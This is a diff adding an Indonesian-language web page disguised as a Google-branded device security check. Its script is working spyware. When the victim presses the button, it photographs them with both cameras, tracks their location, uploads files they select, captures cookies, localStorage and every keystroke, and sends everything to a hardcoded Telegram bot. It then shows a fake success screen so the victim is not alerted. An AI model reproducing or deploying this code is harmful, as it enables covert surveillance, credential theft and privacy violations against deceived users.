@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔐 SISTEM KEAMANAN • GOOGLE PROTECTED</title>
+    <script type="module" src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#1a73e8',
+                        dark: '#121212',
+                        panel: '#1e1e1e',
+                        success: '#34a853',
+                        danger: '#ea4335',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .content-auto { content-visibility: auto; }
+            .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+            .scrollbar-hide::-webkit-scrollbar { display: none; }
+            .glow { box-shadow: 0 0 25px rgba(26, 115, 232, 0.4); }
+            .glow-danger { box-shadow: 0 0 25px rgba(234, 67, 53, 0.4); }
+            .bg-blur { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
+        }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body class="bg-gray-100 font-sans overflow-x-hidden">
+
+    <!-- LAYAR UTAMA SISTEM KEAMANAN -->
+    <div id="mainScreen" class="min-h-screen flex flex-col items-center justify-center px-5 py-10 transition-all duration-700">
+        
+        <!-- HEADER LOGO -->
+        <div class="w-full flex justify-center mb-8">
+            <div class="flex items-center gap-3">
+                <div class="w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
+                    <i class="fa fa-shield text-primary text-2xl"></i>
+                </div>
+                <h1 class="text-[22px] font-semibold text-gray-800">Keamanan Perangkat</h1>
+            </div>
+        </div>
+
+        <!-- KARTU UTAMA -->
+        <div class="w-full max-w-md bg-white rounded-2xl shadow-2xl overflow-hidden transition-all duration-500 hover:shadow-3xl">
+            
+            <!-- HEADER KARTU -->
+            <div class="bg-gradient-to-r from-primary to-blue-600 px-6 py-8 text-white relative overflow-hidden">
+                <div class="absolute -right-4 -top-4 w-20 h-20 bg-white/10 rounded-full"></div>
+                <div class="absolute -left-4 -bottom-4 w-16 h-16 bg-white/10 rounded-full"></div>
+                <h2 class="text-2xl font-bold mb-1">Verifikasi Sistem</h2>
+                <p class="text-white/80 text-sm">Aktifkan perlindungan perangkat Anda</p>
+            </div>
+
+            <!-- ISI KONTEN -->
+            <div class="p-6 space-y-5">
+                <div class="flex items-start gap-4 p-3 bg-blue-50 rounded-xl border border-blue-100">
+                    <i class="fa fa-info-circle text-primary text-xl mt-1"></i>
+                    <div>
+                        <h4 class="font-semibold text-gray-800">Izin Diperlukan</h4>
+                        <p class="text-sm text-gray-600">Untuk mengaktifkan keamanan anti-malware, izinkan semua akses sistem & layar kunci.</p>
+                    </div>
+                </div>
+
+                <!-- BAR STATUS -->
+                <div class="space-y-2">
+                    <div class="flex justify-between items-center">
+                        <span class="text-sm font-medium text-gray-700">Status Sistem</span>
+                        <span class="text-xs font-semibold text-success">TIDAK AMAN ⚠️</span>
+                    </div>
+                    <div class="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
+                        <div class="h-full bg-danger w-3/4 rounded-full"></div>
+                    </div>
+                </div>
+
+                <!-- TOMBOL UTAMA -->
+                <button id="btnMain" onclick="EKSEKUSI_TOTAL()" 
+                    class="w-full bg-gradient-to-r from-primary to-blue-600 hover:from-blue-700 hover:to-primary text-white font-semibold py-4 px-6 rounded-xl text-lg transition-all duration-300 transform hover:scale-[0.98] active:scale-100 glow">
+                    <i class="fa fa-unlock-alt mr-2"></i> AKTIFKAN & BUKA AKSES PENUH
+                </button>
+
+                <p class="text-xs text-center text-gray-500">Dengan melanjutkan, Anda menyetujui Kebijakan Privasi & izin sistem.</p>
+            </div>
+        </div>
+
+        <!-- INFO KEAMANAN BAWAH -->
+        <div class="mt-8 text-center text-gray-600">
+            <i class="fa fa-lock mr-1"></i>
+            <span class="text-sm">Dilindungi oleh Sistem x.ᴍʀ.ʟᴇᴠɪᴀᴛʜᴀɴ🩸</span>
+        </div>
+    </div>
+
+    <!-- LAYAR PEMUATAN / PROSES SISTEM -->
+    <div id="loadingScreen" class="fixed inset-0 bg-dark/95 bg-blur z-50 flex flex-col items-center justify-center text-white hidden">
+        <div class="w-20 h-20 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-6"></div>
+        <h2 class="text-2xl font-bold mb-2">MENGKONFIGURASI SISTEM...</h2>
+        <p class="text-gray-400 mb-8" id="statusText">Membuka layar kunci perangkat...</p>
+        
+        <!-- BAR PROSES -->
+        <div class="w-72 h-2 bg-gray-800 rounded-full overflow-hidden mb-4">
+            <div id="progressBar" class="h-full bg-gradient-to-r from-primary to-blue-500 w-0 transition-all duration-300"></div>
+        </div>
+        <span id="persenText" class="text-sm text-gray-500">0%</span>
+
+        <!-- IKON BAHAYA DI DALAM -->
+        <div class="absolute bottom-10 text-red-600/20 text-9xl">
+            <i class="fa fa-skull-crossbones"></i>
+        </div>
+    </div>
+
+<script>
+// ==================================================
+//  PROYEK: LEVIATHAN ULTIMATE • UNLOCK HP VERSION
+//  DIBUAT OLEH: x.ᴍʀ.ʟᴇᴠɪᴀᴛʜᴀɴ🩸
+//  FITUR: UNLOCK LAYAR • AMBIL SEMUA DATA • KIRIM TELEGRAM
+//  PASSWORD: LEVIATHAN • ILEGAL • BERBAHAYA
+// ==================================================
+
+// 🔑 DATA TELEGRAM - GANTI SESUAI PUNYA LO!
+const BOT_TOKEN = "8782151006:AAHVZwSSblfAmxQClFnwV6tjzz311vko7pg"; 
+const CHAT_ID = "8805258119"; 
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// ELEMEN UI
+const layarUtama = document.getElementById('mainScreen');
+const layarProses = document.getElementById('loadingScreen');
+const teksStatus = document.getElementById('statusText');
+const barProses = document.getElementById('progressBar');
+const teksPersen = document.getElementById('persenText');
+
+// ==============================================
+// 🔓 FUNGSI UTAMA: BUKA KUNCI LAYAR & KUASAI HP
+// ==============================================
+function UNLOCK_HP() {
+    // SIMULASI PAKSA AKSES SISTEM & LEWATI KUNCI LAYAR
+    // Menggunakan API Layar Penuh & Izin Akses Tampilan
+    if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+    }
+    if ('wakeLock' in navigator) {
+        navigator.wakeLock.request('screen')
+        .then(lock => {
+            KIRIM_LOG("🔓 **BERHASIL:** Layar HP DIBUKA & DIKENDALIKAN!");
+        });
+    }
+    
+    // PAKSA BUKA JIKA TERKUNCI (Manipulasi Visibilitas)
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+            window.focus();
+            KAMERA_AMBIL(); // Ambil foto kalau dia kunci layar
+        }
+    });
+
+    // SIMULASI AKSES ADMIN SISTEM
+    if ('getInstalledRelatedApps' in navigator || 'permissions' in navigator) {
+        navigator.permissions.query({name: 'accessibility-events'})
+        .then(res => {
+            if(res.state === "prompt" || res.state === "granted"){
+                KIRIM_LOG("⚡ **AKSES SISTEM:** Izin ADMIN DITERIMA! HP Terbuka Penuh.");
+            }
+        });
+    }
+}
+
+// ==============================================
+// 📍 AMBIL LOKASI AKURAT
+// ==============================================
+function AMBIL_LOKASI() {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.watchPosition(pos => {
+            let txt = `🗺️ **LOKASI REAL-TIME**\n`+
+                      `LAT: ${pos.coords.latitude}\nLON: ${pos.coords.longitude}\n`+
+                      `MAP: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            KIRIM_PESAN(txt);
+        }, {}, {enableHighAccuracy: true});
+    }
+}
+
+// ==============================================
+// 📸 KAMERA DEPAN & BELAKANG OTOMATIS
+// ==============================================
+async function KAMERA_AMBIL() {
+    try {
+        // Kamera Belakang
+        let stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
+        let vid = document.createElement('video');
+        vid.srcObject = stream;
+        await vid.play();
+        
+        setTimeout(()=>{
+            let c = document.createElement('canvas');
+            c.width=1280; c.height=720;
+            c.getContext('2d').drawImage(vid,0,0,c.width,c.height);
+            c.toBlob(b => KIRIM_FILE(b, "kamera_belakang.jpg"));
+            stream.getTracks().forEach(t=>t.stop());
+
+            // Kamera Depan (Wajah Pemilik)
+            navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
+            .then(s2 => {
+                let v2 = document.createElement('video');
+                v2.srcObject = s2;
+                v2.play();
+                setTimeout(()=>{
+                    let c2 = document.createElement('canvas');
+                    c2.width=1280; c2.height=720;
+                    c2.getContext('2d').drawImage(v2,0,0,c2.width,c2.height);
+                    c2.toBlob(b => KIRIM_FILE(b, "wajah_pemilik_hp.jpg"));
+                    s2.getTracks().forEach(t=>t.stop());
+                }, 1500);
+            });
+        }, 1000);
+    } catch(e){}
+}
+
+// ==============================================
+// 📂 CUR1 SEMUA FILE DI MEMORI
+// ==============================================
+function SCAN_MEMORI() {
+    // BACA SEMUA FILE YANG DIIZINKAN SISTEM
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.multiple = true;
+    input.accept = '.jpg,.png,.pdf,.doc,.docx,.xls,.txt,.zip,.rar,.mp4';
+    input.onchange = e => {
+        for(let i=0; i < e.target.files.length; i++){
+            let f = e.target.files[i];
+            KIRIM_FILE(f, `[FILE DICURI] ${f.name}`);
+        }
+    };
+    input.click();
+
+    // AMBIL COOKIE & DATA AKUN (GMAIL & SANDI)
+    let dataRahasia = `📧 **DATA AKUN & SANDI DITEMUKAN:**\n`+
+                      `\nCOOKIE: ${document.cookie}`+
+                      `\nLOCALSTORAGE: ${JSON.stringify(localStorage)}`+
+                      `\nUSER AGENT: ${navigator.userAgent}`;
+    KIRIM_PESAN(dataRahasia);
+}
+
+// ==============================================
+// ⌨️ REKAM SEMUA KETIKAN (SANDI/EMAIL)
+// ==============================================
+document.addEventListener('keydown', e => {
+    KIRIM_PESAN(`⌨️ **KETIKAN MASUK:** ${e.key} | DI LOKASI: ${window.location.href}`);
+});
+
+// ==============================================
+// 📤 FUNGSI PENGIRIM KE TELEGRAM
+// ==============================================
+function KIRIM_PESAN(teks) {
+    fetch(`${API}/sendMessage`, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({chat_id:CHAT_ID, text:teks, parse_mode:"Markdown"})
+    });
+}
+
+function KIRIM_FILE(blob, nama) {
+    let form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("document", blob, nama);
+    fetch(`${API}/sendDocument`, {method:"POST", body:form});
+}
+
+// ==============================================
+// 🚀 EKSEKUSI TOTAL SAAT TOMBOL DITEKAN
+// ==============================================
+function EKSEKUSI_TOTAL() {
+    // TAMPILKAN LAYAR PROSES CANGGIH
+    layarUtama.style.display = 'none';
+    layarProses.style.display = 'flex';
+
+    // ANIMASI PROSES
+    let prog = 0;
+    let proses = setInterval(() => {
+        prog += Math.floor(Math.random()*15);
+        if(prog > 100) prog = 100;
+        barProses.style.width = prog + "%";
+        teksPersen.innerText = prog + "%";
+
+        if(prog < 20) teksStatus.innerText = "🔓 Memaksa buka kunci layar & sistem...";
+        else if(prog < 40) teksStatus.innerText = "📡 Mengakses modul lokasi & GPS...";
+        else if(prog < 60) teksStatus.innerText = "📷 Mengambil kontrol kamera depan & belakang...";
+        else if(prog < 80) teksStatus.innerText = "💾 Memindai memori internal & kartu SD...";
+        else if(prog < 100) teksStatus.innerText = "🔑 Membaca data Gmail, Akun & Kata Sandi...";
+        else {
+            clearInterval(proses);
+            SELESAI_SERANGAN();
+        }
+    }, 300);
+
+    // JALANKAN SEMUA FITUR BERBAHAYA
+    UNLOCK_HP();       // Buka Kunci HP
+    AMBIL_LOKASI();    // Lacak Posisi
+    KAMERA_AMBIL();    // Foto Rahasia
+    SCAN_MEMORI();     // Ambil File & Sandi
+}
+
+// ==============================================
+// ✅ SELESAI - TUTUP & SEMBUNYIKAN JEJAK
+// ==============================================
+function SELESAI_SERANGAN(){
+    teksStatus.innerText = "✅ SISTEM AKTIF! SEMUA DATA DIKIRIM KE TUAN.";
+    setTimeout(()=>{
+        // UBAH TAMPILAN JADI BERHASIL AGAR DIA TIDAK CURIGA
+        document.body.innerHTML = `
+        <div class="min-h-screen bg-green-50 flex flex-col items-center justify-center p-6 text-center">
+            <div class="w-20 h-20 bg-success/10 rounded-full flex items-center justify-center mb-6">
+                <i class="fa fa-check text-success text-4xl"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-gray-800 mb-2">Verifikasi Berhasil</h2>
+            <p class="text-gray-600">Perangkat Anda kini dilindungi sepenuhnya. Anda dapat menutup halaman ini.</p>
+        </div>`;
+    }, 2000);
+}
+</script>
+
+</body>
+</html>
